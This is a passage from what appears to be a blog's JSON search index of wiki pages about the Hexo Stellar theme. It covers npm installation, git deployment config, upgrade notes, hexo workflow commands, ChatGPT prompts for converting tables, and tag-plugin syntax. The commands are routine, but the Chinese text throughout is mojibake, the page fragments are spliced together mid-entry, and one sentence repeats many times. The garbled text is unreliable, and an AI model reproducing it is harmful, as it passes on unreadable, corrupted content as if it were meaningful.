æ‰§è¡ŒæˆåŠŸï¼Œè®¿é—®localhost:4000çœ‹åˆ°ç½‘é¡µï¼Œå³æ­å»ºæˆåŠŸ æ›´æ¢ä¸ºstellarä¸»é¢˜ ç”¨gitæˆ–npmæ–¹å¼å¯ç”¨stellarä¸»é¢˜ è¿™é‡Œä»¥npmä¸ºä¾‹ï¼Œ@åçš„æ•°å­—æ˜¯æŒ‡å®šç‰ˆæœ¬å· 1npm i hexo-theme-stellar@1.25.0 åœ¨ blog/_config.yml æ–‡ä»¶ä¸­æ‰¾åˆ°å¹¶ä¿®æ”¹ 1theme: stellar åœ¨æœ¬åœ°é¢„è§ˆ 1hexo clean &amp;&amp; hexo s ç”¨npmæ–¹å¼å®‰è£…çš„ä¸»é¢˜ï¼Œå°†_MyStellarBlog_v1.25.0 ode_modules\\hexo-theme-stellarä¸‹çš„ymlæ”¹åä¸º_config.stellar.ymlæ‹·è´åˆ°åšå®¢æ ¹ç›®å½• åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­çš„é…ç½®ä¿¡æ¯ä¼˜å…ˆçº§é«˜äºä¸»é¢˜æ–‡ä»¶å¤¹ä¸­çš„é…ç½®æ–‡ä»¶ï¼Œç‰ˆæœ¬æ›´æ–°åªä¼šæ›´æ–°_config.ymlæ–‡ä»¶ å‚è€ƒstellaræ‰‹å†Œä¸ªæ€§åŒ–ä¿®æ”¹ å®˜æ–¹æ–‡æ¡£æ€»æ˜¯ä¿æŒæœ€æ–°çŠ¶æ€ï¼Œæ—§ç‰ˆæœ¬çš„é…ç½®ä¿¡æ¯ï¼ˆä¸€äº›å­—æ®µï¼‰å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ‰€ä»¥æ—§ç‰ˆæœ¬å‚è€ƒæœ€æ–°ç‰ˆå®˜æ–¹æ–‡æ¡£å¯èƒ½ä¸å‡†ç¡® å‚è€ƒé“¾æ¥ åé¢æ•´ç†ï¼šhttps://zhuanlan.zhihu.com/p/26625249 https://www.cnblogs.com/visugar/p/6821777.html https://yangtao.site/2018/04/08/hexo/ https://www.cnblogs.com/visugar/p/6821777.html https://yangtao.site/2018/07/06/hexo-order/ éƒ¨ç½² å®‰è£…æ’ä»¶1npm install hexo-deployer-git --save ä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­çš„éƒ¨ç½²ï¼š _config.yml1234567# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy: type: git repo: https://github.com/Misc0101/misc0101.github.io.git branch: master message: &quot;Update at &#123;&#123; now(&#x27;YYYY-MM-DD HH:mm:ss Z&#x27;) &#125;&#125;&quot;"},{"title":"å¤‡ä»½ä¸å‡çº§","path":"/wiki/stellar/å¤‡ä»½ä¸å‡çº§.html","content":"è¿™ç¯‡æ–‡ç« è®²è¿°å¦‚ä½•å¤‡ä»½åšå®¢å’Œå¹³ç¨³å‡çº§Stellarä¸»é¢˜ï¼Œç¡®ä¿æ•°æ®å®‰å…¨å’Œç½‘ç«™çš„æœ€æ–°æ€§ã€‚ ç‰ˆæœ¬å¯¹æ¯”åŠæ›´æ–°è®°å½• 1.19.0(å«)ä¹‹å‰çš„ç‰ˆæœ¬æ˜¯æ—§ç‰ˆwiki 1.20.0ä»¥åæ˜¯æ–°ç‰ˆwiki 1.21.0ç‰ˆwikié¡µé¢projectä¼šé»˜è®¤å¸¦å›¾ç‰‡ 1.25.0ç‰ˆæœ¬å¼€å§‹æ–°å¢ä¸“æ åŠŸèƒ½ 1.26.0ç‰ˆåŠä»¥ä¸Šï¼š å¯ä»¥è‡ªå®šä¹‰ä¾§è¾¹æ èƒŒæ™¯ï¼ˆçº¯è‰²/æ¸å˜/å›¾ç‰‡ï¼‰ wikié…ç½®å­—æ®µå‘ç”Ÿéƒ¨åˆ†å˜åŒ– ç”¨1.19ç‰ˆæœ¬åœ¨ä¸€å¹´å·¦å³ï¼Œä½¿ç”¨ä¸‹æ¥é™¤äº†wikiæ–‡ç« å‡ºç°å› ä¸ºSectionsåŸå› éœ€è¦å¯¹æ–‡ç« orderé‡æ–°æ’åºçš„ä¸ä¾¿å¤–ï¼Œå…¶å®æ²¡å•¥æ›´æ–°çš„å¿…è¦ã€‚ 2023å¹´2ã€3æœˆï¼Ÿä½¿ç”¨å½“æ—¶Stellaræœ€æ–°ç‰ˆä½œä¸ºåšå®¢ï¼Œå®Œæˆä»butterflyä¸»é¢˜æ–‡ç« çš„è¿ç§»2024å¹´2æœˆ22æ—¥å¼€å§‹çš„ä¸€æ®µæ—¶é—´å°†stellarä»1.19.0ç‰ˆæœ¬å‡çº§åˆ°1.25.0ç‰ˆæœ¬ï¼Œå¹¶é™†ç»­è¿ç§»æ–‡ç« å‡çº§å¿ƒè·¯å†ç¨‹ï¼šå‡åˆ°1.20.0å°±èƒ½ç”¨æ–°ç‰ˆwiki1.21.0wikié¡µé¢projecté»˜è®¤å¸¦å›¾ç‰‡ï¼Œä¿ºæ²¡æ‰¾åˆ°å›¾ç‰‡å…³é—­æ–¹æ³•1.25.0æœ‰ä¸“æ åŠŸèƒ½1.26.0ç‰ˆæœ¬ä»¥ä¸Šä¾§è¾¹æ æ„Ÿè§‰å˜èŠ±äº†ä¸å’Œè°ï¼Œè®¾ç½®ä¸ºé€æ˜ï¼Œå¯¼èˆªæ å’Œtocé£æ ¼åˆå˜äº†ï¼Œæ•´ä½“é¡µé¢ä¸å’Œè°æƒè¡¡ä¹‹ä¸‹ï¼Œprojecté»˜è®¤å¸¦å›¾ç‰‡è¿™ç‚¹å¯ä»¥ç¨å¾®å¿å—ï¼Œäºæ˜¯å‡åˆ°1.25.0å¦‚æœå“ªä½çŸ¥é“wikié¡µé¢projecté»˜è®¤å¸¦å›¾ç‰‡å¦‚ä½•å…³é—­è¯·å‘Šè¯‰ä¿ºä¸€å£°ï¼Œä¸èƒœæ„Ÿæ¿€"},{"title":"æ—¥å¸¸å·¥ä½œæµ","path":"/wiki/stellar/æ—¥å¸¸å·¥ä½œæµ.html","content":"å†™ä½œ ç”Ÿæˆä¸€ç¯‡post 1hexo new post &quot;My New Post&quot; å°†åœ¨_post/ä¸‹ç”ŸæˆMy New Post.mdæ–‡ä»¶ã€‚ç„¶åå°†My New Post.mdç§»åŠ¨åˆ°blogæ–‡ä»¶å¤¹é‡Œ åœ¨wikiä¸‹ç”Ÿæˆ 1hexo new page --path /wiki/stellar/&quot;My New Wiki&quot; &quot;My New Wiki&quot; å°†åœ¨/wiki/stellar/ä¸‹ç”ŸæˆMy New Post.mdæ–‡ä»¶ï¼Œfront-matterä¸­çš„titleä¸ºï¼šMy New Wikiï¼ˆå‘½ä»¤ä¸­åé¢çš„é‚£ä¸ª&quot;My New Wiki&quot;ï¼‰ éœ€è¦ä¿®æ”¹mdä¸­front-matterçš„wikiå­—æ®µæŒ‡å‘é¡¹ç›®ID æœ¬åœ°é¢„è§ˆ 1hexo clean &amp;&amp; hexo s -p 5000 é»˜è®¤4000ç«¯å£ï¼Œå¦‚æœç«¯å£è¢«å ç”¨ï¼Œé¢å¤–ç”¨-på‚æ•°æ¢ç«¯å£ ç”Ÿæˆæœ¬åœ°é™æ€æ–‡ä»¶ 1hexo g More info: Generating éƒ¨ç½² 1hexo d å¸¸è¯´çš„ä¸‰è¿ 1hexo clean &amp;&amp; hexo g &amp;&amp; hexo d ç½®é¡¶åŠŸèƒ½ åœ¨front-matterä¸­ä½¿ç”¨pin: trueæˆ–sticky: æ•°å­— stickyæ–¹å¼ç½®é¡¶ï¼Œæ•°å­—è¶Šå¤§ï¼Œç½®å¾—è¶Šé¡¶ ä½¿ç”¨pin: trueæ–¹å¼ä¼šåœ¨å¯¹åº”çš„æ–‡ç« å¤šä¸€ä¸ªèµçš„å°å¾½ç«  1pin: true 1sticky: æ•°å­— æ³¨ï¼š1.26.0ç‰ˆæœ¬åä¸å†æ”¯æŒ pin: true æ¥ç½®é¡¶ï¼Œå› ä¸ºå®˜æ–¹å·²ç»æ”¯æŒè¯¥åŠŸèƒ½ï¼Œæ–¹æ³•ä¸ºï¼š sticky: æ•°å­— åˆå¹¶å•å…ƒçš„è¡¨æ ¼ å‚è€ƒï¼šMarkdownè¡¨æ ¼ã€å•å…ƒæ ¼åˆå¹¶ã€å¿«é€Ÿç¼–è¾‘è¡¨æ ¼ æ³•ä¸€ï¼šç¼–è¾‘å™¨åœ¨çº¿è¡¨æ ¼ï¼ˆæ ¹æ®è¡¨æ ¼è‡ªåŠ¨ç”ŸæˆHTMLè¯­è¨€ï¼‰https://www.tablesgenerator.com/markdown_tables æ³•äºŒï¼šåœ¨Excelå¡«å¥½è¡¨æ ¼åï¼Œæˆªå›¾ï¼Œå‘ç»™gptï¼Œpromptï¼š 1ä½ å¥½ï¼ŒChatGPTã€‚æˆ‘å°†å‘é€ç»™ä½ ä¸€äº›å«æœ‰è¡¨æ ¼çš„å›¾ç‰‡ï¼Œè¿™ä¸ªè¡¨æ ¼ç‰¹åˆ«ä¹‹å¤„åœ¨äºå®ƒåŒ…å«äº†åˆå¹¶çš„å•å…ƒæ ¼ã€‚æˆ‘éœ€è¦ä½ ä¸“æ³¨äºè¡¨æ ¼çš„å†…å®¹å’Œå•å…ƒæ ¼åˆå¹¶çš„æƒ…å†µï¼Œå¹¶å°†å›¾ä¸­çš„æ¯ä¸ªè¡¨æ ¼åˆ†åˆ«è½¬æ¢æˆHTMLæ ¼å¼ã€‚åœ¨è½¬æ¢æ—¶ï¼Œè¯·ç¡®ä¿æ­£ç¡®åæ˜ å‡ºå“ªäº›å•å…ƒæ ¼è¢«åˆå¹¶äº†ï¼Œä»¥åŠå®ƒä»¬çš„å…·ä½“å†…å®¹ã€‚ä¸éœ€è¦å¤ªè¿‡å…³æ³¨å…¶ä»–ç»†èŠ‚ï¼Œå¦‚å­—ä½“ã€é¢œè‰²æˆ–è¾¹æ¡†æ ·å¼ã€‚è¯·æä¾›è½¬æ¢åçš„HTMLä»£ç ã€‚ 1ä½ å¥½ï¼ŒChatGPTã€‚æˆ‘ä»Excelä¸­å¤åˆ¶äº†ä¸€ä¸ªè¡¨æ ¼çš„å†…å®¹å¹¶ç²˜è´´åˆ°äº†è®°äº‹æœ¬ä¸­ï¼Œä»¥ä¾¿å°†å…¶å‘é€ç»™ä½ ã€‚æˆ‘éœ€è¦ä½ æ ¹æ®è®°äº‹æœ¬ä¸­çš„å†…å®¹æ¥åˆ¤æ–­å“ªäº›å•å…ƒæ ¼åœ¨åŸå§‹Excelè¡¨æ ¼ä¸­æ˜¯åˆå¹¶çš„ï¼Œå¹¶å°†å…¶è½¬æ¢æˆHTMLæ ¼å¼ï¼Œä»¥ä¾¿å¯ä»¥åµŒå…¥åˆ°Markdownæ–‡ä»¶ä¸­ã€‚è¯·æ ¹æ®æ–‡æœ¬æ ¼å¼è¯†åˆ«åˆå¹¶çš„å•å…ƒæ ¼ï¼Œå¹¶æä¾›å‡†ç¡®çš„HTMLä»£ç æ¥åæ˜ è¿™äº›åˆå¹¶ã€‚ å°†Excelè¡¨æ ¼å†…å®¹å¤åˆ¶åˆ°notepadä¸­ï¼Œç„¶åå°†notepadä¸­çš„å†…å®¹å‘ç»™gpt 1è°¢è°¢ï¼Œè¯·åœ¨æ ¹æ®å¦‚ä¸‹å†…å®¹è¿›è¡Œè½¬æ¢"},{"title":"æ ‡ç­¾ç»„ä»¶è¯­æ³•","path":"/wiki/stellar/æ ‡ç­¾ç»„ä»¶è¯­æ³•.html","content":"è¿™ç¯‡æ–‡ç« è®°å½•Stellarä¸»é¢˜æ”¯æŒçš„å„ç§æ ‡ç­¾è¯­æ³•ï¼Œå¸®åŠ©è‡ªå·±æ›´ç²¾å‡†åœ°ä½¿ç”¨æ ‡ç­¾æ¥ä¸°å¯Œå†…å®¹å±•ç¤ºã€‚ æ¬è¿äº: è¡¨è¾¾ç±»æ ‡ç­¾ç»„ä»¶ï¼ˆ19+ä¸ªï¼‰ æ•°æ®ç±»æ ‡ç­¾ç»„ä»¶ï¼ˆ6ä¸ªï¼‰ å®¹å™¨ç±»æ ‡ç­¾ç»„ä»¶ï¼ˆ11ä¸ªï¼‰ æ³¨æ„äº‹é¡¹ æœ‰äº›æ ‡ç­¾è¦æ³¨æ„æˆå¯¹å‡ºç°ï¼Œå¦åˆ™hexo sä¼šæŠ¥é”™ï¼Œå¤§æ¦‚ç‡æ˜¯æ ‡ç­¾çš„é—®é¢˜ ä¹‹å‰å‡ºç°è¿‡çš„é—®é¢˜ï¼š é—®é¢˜ä¿®æ­£123&#123;% quot ç»ƒä¹  el:h2 %&#125;1)æ®µå¯„å­˜å™¨åªèƒ½çœ‹è§16ä½ï¼Œå¦‚ä½•è¯æ˜æœ‰96ä½? æŠŠ)å»æ‰ 123&#123;% quot ç»ƒä¹  el:h2 %&#125;æ®µå¯„å­˜å™¨åªèƒ½çœ‹è§16ä½ï¼Œå¦‚ä½•è¯æ˜æœ‰96ä½? ç±»åˆ« è¡¨è¾¾ç±»æ ‡ç­¾ç»„ä»¶ï¼ˆ19+ä¸ªï¼‰ï¼šquotå¼•ç”¨ï¼Œå½©è‰²å¤‡æ³¨å—ï¼Œlinké“¾æ¥å¡ç‰‡ï¼Œokr ç›®æ ‡ç®¡ç†ï¼Œnavbar å¯¼èˆªæ  æ•°æ®ç±»æ ‡ç­¾ç»„ä»¶ï¼ˆ6ä¸ªï¼‰ï¼štimeline æ—¶é—´çº¿ å®¹å™¨ç±»æ ‡ç­¾ç»„ä»¶ï¼ˆ11ä¸ªï¼‰ï¼šå½©è‰²ä»£ç å—ï¼Œgridç½‘æ ¼åˆ†åŒº å¸¸ç”¨ quotå¼•ç”¨ æ•ˆæœå†™æ³•Stellar æ˜¯æœ€å¥½ç”¨çš„ä¸»é¢˜ Stellar æ˜¯æœ€å¥½ç”¨çš„ä¸»é¢˜ çƒ­é—¨è¯é¢˜ çƒ­é—¨è¯é¢˜1234567&#123;% quot Stellar æ˜¯æœ€å¥½ç”¨çš„ä¸»é¢˜ %&#125;&#123;% quot Stellar æ˜¯æœ€å¥½ç”¨çš„ä¸»é¢˜ el:h2 %&#125;&#123;% quot çƒ­é—¨è¯é¢˜ icon:hashtag %&#125;&#123;% quot çƒ­é—¨è¯é¢˜ icon:default %&#125; æ­¤å¤–ï¼ŒåŠ ä¸Š el:h2/h3/h4/h5/h6 å¯ä»¥ä½œä¸ºæ ‡é¢˜ä½¿ç”¨ folderså¤šä¸ªæŠ˜å å®¹å™¨èšåˆ é¢˜ç›®1â€¦é¢˜ç›®2â€¦ è¿‡ç¨‹â€¦ å†™æ³•å¦‚ä¸‹ï¼š 123456&#123;% folders %&#125;&lt;!-- folder é¢˜ç›®1 --&gt;...&lt;!-- folder é¢˜ç›®2 --&gt;...&#123;% endfolders %&#125; 1234&#123;% folders %&#125;&lt;!-- folder è¿‡ç¨‹ --&gt;...&#123;% endfolders %&#125; tabsåˆ†æ å®¹å™¨ æ•ˆæœï¼š å›¾ç‰‡ä»£ç å—è¡¨æ ¼å‡è£…è¿™é‡Œæœ‰ä¸€å¼ å›¾12let x = 123print(&quot;hello world&quot;) a b c a1 b1 c1 a2 b2 c2 å†™æ³•ï¼š 12345678&#123;% tabs active:1 align:center %&#125;&lt;!-- tab å›¾ç‰‡ --&gt;&lt;!-- tab ä»£ç å— --&gt;&lt;!-- tab è¡¨æ ¼ --&gt;&#123;% endtabs %&#125; gridç½‘æ ¼åˆ†åŒº+å½©è‰²ä»£ç å— 1.21.0ç‰ˆæœ¬åablock æ ‡ç­¾ç»„ä»¶é‡å‘½åä¸º box (æ‰¹é‡æ›¿æ¢å³å¯ï¼‰ 1.24.0ç‰ˆæœ¬åç½‘æ ¼ç»„ä»¶ grid ä¸­çš„åˆ†éš”ç¬¦å†™æ³•å˜æ›´ï¼Œç°åœ¨ä»…æ”¯æŒ &lt;!-- cell --&gt; å›ºå®šå†™æ³• æ•ˆæœå†™æ³• æ¨èçš„å†™æ³•123func test() &#123; // ...&#125; ä¸æ¨èçš„å†™æ³•123func test() -&gt; () &#123; // ...&#125; c:2æ˜¯å›ºå®šä¸º2åˆ— 123456789101112131415161718192021222324&#123;% grid c:2 %&#125;&lt;!-- cell --&gt;**æ¨èçš„å†™æ³•**&#123;% box child:codeblock color:green %&#125;```swiftfunc test() &#123; // ...&#125;```&#123;% endbox %&#125;&lt;!-- cell --&gt;**ä¸æ¨èçš„å†™æ³•**&#123;% box child:codeblock color:red %&#125;```swiftfunc test() -&gt; () &#123; // ...&#125;```&#123;% endbox %&#125;&#123;% endgrid %&#125; å›ºå®šä¸¤åˆ—ï¼š æ•ˆæœå†™æ³• 1123 1123 12345678910&#123;% grid c:2 %&#125;&lt;!-- cell --&gt;...&lt;!-- cell --&gt;...&#123;% endgrid %&#125; æ”¶å½• å½©è‰²å¤‡æ³¨å— ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ å…¨éƒ¨é¢œè‰²æ•ˆæœå†™æ³•ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚12345678910111213141516171819202122&#123;% note ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚ color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ %&#125;&#123;% note color:red ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚ color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ %&#125;&#123;% note color:orange ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚ color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ %&#125;&#123;% note color:yellow ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚ color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ %&#125;&#123;% note color:green ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚ color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ %&#125;&#123;% note color:cyan ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚ color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ %&#125;&#123;% note color:blue ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚ color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ %&#125;&#123;% note color:purple ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚ color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ %&#125;&#123;% note color:light ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚ color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ %&#125;&#123;% note color:dark ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚ color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ %&#125;&#123;% note color:warning ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚ color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ %&#125;&#123;% note color:error ä¸€å…±æ”¯æŒ12ç§é¢œè‰²ï¼Œå¯ä»¥æ»¡è¶³å‡ ä¹æ‰€æœ‰çš„éœ€æ±‚äº†ã€‚ color å¯è®¾ç½® redã€orangeã€yellowã€greenã€cyanã€blueã€purpleã€lightã€darkã€warningã€error å‡ ç§å–å€¼ã€‚ %&#125; timeline æ—¶é—´çº¿ é™æ€æ•°æ®æ˜¯å†™æ­»åœ¨ md æºæ–‡ä»¶ä¸­çš„ï¼Œåœ¨ deploy æ—¶å°±å·²ç»ç¡®å®šäº†ã€‚ æ•ˆæœå†™æ³•2021 å¹´ 2 æœˆ 16 æ—¥ä¸»è¦éƒ¨åˆ†åŠŸèƒ½å·²ç»å¼€å‘çš„å·®ä¸å¤šäº†ã€‚2021 å¹´ 2 æœˆ 11 æ—¥ä»Šå¤©é™¤å¤•ï¼Œä¹Ÿæ˜¯ç”Ÿæ—¥ï¼Œä¸€ä¸ªäººåœ¨å¤–åœ°è¿‡å¹´+è¿‡ç”Ÿæ—¥ï¼Œç†¬å¤œå¼€å‘æ–°ä¸»é¢˜ï¼Œå°½é‡åœ¨å‡æœŸç»“æŸå‰æ”¾å‡ºå…¬æµ‹ç‰ˆã€‚123456&#123;% timeline %&#125;&lt;!-- node 2021 å¹´ 2 æœˆ 16 æ—¥ --&gt;ä¸»è¦éƒ¨åˆ†åŠŸèƒ½å·²ç»å¼€å‘çš„å·®ä¸å¤šäº†ã€‚&lt;!-- node 2021 å¹´ 2 æœˆ 11 æ—¥ --&gt;ä»Šå¤©é™¤å¤•ï¼Œä¹Ÿæ˜¯ç”Ÿæ—¥ï¼Œä¸€ä¸ªäººåœ¨å¤–åœ°è¿‡å¹´+è¿‡ç”Ÿæ—¥ï¼Œç†¬å¤œå¼€å‘æ–°ä¸»é¢˜ï¼Œå°½é‡åœ¨å‡æœŸç»“æŸå‰æ”¾å‡ºå…¬æµ‹ç‰ˆã€‚&#123;% endtimeline %&#125; sitesç½‘ç«™å¡ç‰‡ https://xaoxuu.com/wiki/stellar/tag-plugins/data/#sites-ç½‘ç«™å¡ç‰‡ okr ç›®æ ‡ç®¡ç† è¿™ä¸ªåŠŸèƒ½åœ¨ 1.20.0 ç‰ˆæœ¬åå¼€å§‹æ”¯æŒ æ•ˆæœå†™æ³• O1 2024å¹´çš„å°ç›®æ ‡ï¼šå®Œæˆ Volantis 6.0 å¹¶å‘å¸ƒä¸Šçº¿ æ¥è‡ª2025å¹´çš„å¤ç›˜ï¼šå·²ã€ŠåŸºæœ¬ã€‹å®ç°ç›®æ ‡ æ­£å¸¸ 44% KR1 é‡æ„ tag-plugins å’Œ wiki ç³»ç»Ÿ å½“ KR è¿›åº¦ä¸º 100% æ—¶ï¼Œæ ‡ç­¾é»˜è®¤æ˜¾ç¤ºä¸º å·²å®Œæˆå½“ KR æœªè®¾ç½®è¿›åº¦æ—¶ï¼Œé»˜è®¤ä¸º 0%å½“ O æœªè®¾ç½®è¿›åº¦æ—¶ï¼Œåˆ™æ˜¾ç¤ºæ‰€æœ‰ KR è¿›åº¦å¹³å‡å€¼ å·²å®Œæˆ 100% KR2 å®Œæˆä¸»è¦é¡µé¢è®¾è®¡ç¨¿ å°æç¤º1å°æç¤º2æ‚¨å¯ä»¥åœ¨ _config.yml æ–‡ä»¶ä¸­ä¿®æ”¹æ ‡ç­¾çš„é¢œè‰²å’Œæ–‡æ¡ˆæ‚¨å¯ä»¥åœ¨ _config.yml æ–‡ä»¶ä¸­å¢åŠ ä»»æ„çš„æ ‡ç­¾é…ç½® å»¶æœŸ 90% KR3 å®Œæˆå‰ç½®å‡†å¤‡å·¥ä½œï¼ˆå¦‚æœä½ çŸ¥é“ç­”æ¡ˆï¼Œè¯·åœ¨ç•™è¨€åŒºå¸®å¸®æˆ‘ï¼ğŸ¥¹ï¼‰ åœ¨å’¸æ°´å’Œæµ·æ»©ä¹‹é—´æ‰¾ä¸€äº©åœ°æ±‚å‡ºåœ†å‘¨ç‡å15ä½æ‰¾å‡ºå®‡å®™çš„ç»ˆæé€»è¾‘å»åœ°ç‹±é‡Œèµ°ä¸¤æ­¥ æœªå®Œæˆ -12% KR-4 å¼€å‘ã€æµ‹è¯•å’Œå‘å¸ƒ æ”¯æŒåµŒå¥—æ’å…¥å›¾ç‰‡ç­‰å…¶å®ƒç®€å•ç»„ä»¶ é£é™© 0% 123456789101112131415161718192021222324252627282930313233&#123;% okr o1 %&#125;2024å¹´çš„å°ç›®æ ‡ï¼šå®Œæˆ Volantis 6.0 